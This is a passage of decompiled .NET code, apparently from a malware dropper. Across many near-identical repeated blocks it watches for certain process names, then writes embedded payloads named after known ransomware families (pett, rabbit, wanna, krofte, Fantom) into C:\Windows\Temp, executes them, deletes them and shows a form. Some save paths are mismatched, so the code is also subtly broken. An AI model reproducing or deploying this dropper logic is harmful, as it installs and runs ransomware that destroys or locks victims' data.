					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array10 = processes;
		foreach (Process process10 in array10)
		{
			if (Operators.CompareString(text8, process10.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array11 = processes;
		foreach (Process process11 in array11)
		{
			if (Operators.CompareString(text9, process11.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array12 = processes;
		foreach (Process process12 in array12)
		{
			if (Operators.CompareString(text10, process12.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array13 = processes;
		foreach (Process process13 in array13)
		{
			if (Operators.CompareString(text11, process13.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array14 = processes;
		foreach (Process process14 in array14)
		{
			if (Operators.CompareString(text12, process14.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array15 = processes;
		foreach (Process process15 in array15)
		{
			if (Operators.CompareString(text13, process15.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array16 = processes;
		foreach (Process process16 in array16)
		{
			if (Operators.CompareString(text14, process16.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array17 = processes;
		foreach (Process process17 in array17)
		{
			if (Operators.CompareString(text15, process17.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array18 = processes;
		foreach (Process process18 in array18)
		{
			if (Operators.CompareString(text16, process18.ProcessName, false) == 0)
			{
